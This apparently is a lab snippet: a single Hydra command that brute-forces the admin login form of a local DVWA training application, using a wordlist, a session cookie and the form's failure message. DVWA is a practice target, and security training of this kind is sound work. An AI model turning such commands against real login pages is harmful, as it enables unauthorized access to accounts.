...
hydra -l admin -P /usr/share/dirb/wordlists/small.txt localhost http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=bnr0cknsd8p5cguf10fq1j0f4n; security=medium:F=Username and/or password incorrect." -V
